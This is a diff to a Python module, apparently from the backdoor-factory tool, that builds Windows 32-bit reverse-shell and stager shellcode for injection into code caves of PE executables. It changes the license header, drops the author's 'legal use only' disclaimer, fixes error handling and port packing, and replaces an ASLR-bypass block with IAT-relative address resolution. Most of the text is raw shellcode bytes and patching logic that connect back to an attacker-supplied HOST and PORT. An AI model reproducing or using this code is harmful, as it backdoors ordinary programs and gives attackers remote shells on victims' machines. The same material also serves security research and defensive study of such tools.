@@ -1,27 +1,34 @@
 '''
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
 
-    Copyright (C) 2013,2014, Joshua Pitts
+Copyright (c) 2013-2014, Joshua Pitts
+All rights reserved.
 
-    License:   GPLv3
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+    1. Redistributions of source code must retain the above copyright notice,
+    this list of conditions and the following disclaimer.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+    2. Redistributions in binary form must reproduce the above copyright notice,
+    this list of conditions and the following disclaimer in the documentation
+    and/or other materials provided with the distribution.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
+    3. Neither the name of the copyright holder nor the names of its contributors
+    may be used to endorse or promote products derived from this software without
+    specific prior written permission.
 
-    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
+
 '''
 
 
@@ -51,7 +58,7 @@ class winI32_shellcode():
         hostocts = []
         if self.HOST is None:
             print "This shellcode requires a HOST parameter -H"
-            sys.exit(1)
+            return False
         for i, octet in enumerate(self.HOST.split('.')):
                 hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
@@ -68,7 +75,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         flItms['stager'] = True
 
@@ -225,7 +232,7 @@ class winI32_shellcode():
 
         if flItms['supplied_shellcode'] is None:
             print "[!] User must provide shellcode for this module (-U)"
-            sys.exit(0)
+            return False
         else:
             self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
@@ -330,7 +337,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         flItms['stager'] = True
 
@@ -435,7 +442,7 @@ class winI32_shellcode():
                             "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                             "\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                             "\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
-        self.shellcode2 += struct.pack("<h", self.PORT)
+        self.shellcode2 += struct.pack("<H", self.PORT)
         self.shellcode2 += ("\x00\x00\x53"
                             "\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                             "\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
@@ -461,7 +468,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
         #breakupvar is the distance between codecaves
         breakupvar = eat_code_caves(flItms, 0, 1)
         self.shellcode1 = "\xfc\xe8"
@@ -526,7 +533,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         if 'LoadLibraryA' not in flItms:
             print "[!] Binary does not have the LoadLibraryA API in IAT"
@@ -536,65 +543,19 @@ class winI32_shellcode():
             print "[!] Binary does not have GetProcAddress API in IAT"
             return False
 
-        #### BEGIN ASLR BYPASS ####
-        # This works because we know the original entry point of the application and
-        # where we are supposed to be as we control where our shellcode goes
         self.shellcode1 = "\xfc"   # CLD
-        self.shellcode1 += "\xbb"  # mov value below ebx
-
-        if flItms['NewCodeCave'] is True:
-            if 'CodeCaveVirtualAddress' in flItms:
-
-                #Current address if not in ASLR
-                self.shellcode1 += struct.pack("<I", (flItms['CodeCaveVirtualAddress'] +
-                                                      len(self.shellcode1) +
-                                                      len(self.stackpreserve) +
-                                                      flItms['buffer'] + 201
-                                                      )
-                                               )
-            else:
-                self.shellcode += '\x00x\x00\x00\x00'
-        else:
-            if flItms['CavesPicked'] == {}:
-                self.shellcode1 += '\x00\x00\x00\x00'
-            else:
-                for section in flItms['Sections']:
-                    if section[0] == flItms['CavesPicked'][0][0]:
-                        VirtualLOCofSection = section[2]
-                        diskLOCofSection = section[4]
-
-                #Current address if not in ASLR
-                self.shellcode1 += struct.pack("<I", int(flItms['CavesPicked'][0][1], 16) -
-                                               diskLOCofSection +
-                                               VirtualLOCofSection +
-                                               flItms['ImageBase'] +
-                                               len(self.shellcode1) +
-                                               len(self.stackpreserve) +
-                                               9)
-
-        self.shellcode1 += "\xe8\x00\x00\x00\x00"
-        self.shellcode1 += "\x5e"           # pop esi
-        self.shellcode1 += "\x2b\xf3"       # sub esi,ebx
-        self.shellcode1 += "\x83\xfe\x00"   # cmp esi,0
         self.shellcode1 += "\xbb"           # mov value below to EBX
-        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'])
+        if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
         self.shellcode1 += "\xb9"  # mov value below to ECX
-        self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'])
-        # Don't jump if in ASLR env
-        self.shellcode1 += "\x74\x15"  # JZ (XX) # Jump to location after ALSR check
-        #Find the base addr
-        #Base address difference now in ESI
-        self.shellcode1 += "\xb8"  # mov eax, Normal imagebase
-        self.shellcode1 += struct.pack("<I", flItms['ImageBase'])
-        self.shellcode1 += "\x03\xc6"   # add eax, esi  # NOW YOU HAVE ASLR IMAGEBASE in EAX
-        self.shellcode1 += "\xbb"       # mov ebx, the loadlibA offset
-        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryAOffset'])
-        self.shellcode1 += "\xb9"       # mov ecx, the getprocaddr offset
-        self.shellcode1 += struct.pack("<I", flItms['GetProcAddressOffset'])
-        self.shellcode1 += "\x03\xd8"   # add ebx, eax  #EBX will hold LoadlibAoffset
-        self.shellcode1 += "\x01\xc1"   # add ecx, eax  #ECX will hold Getprocaddress
-
-        ####END ASLR BYPASS####
+        if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
 
         self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                             "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
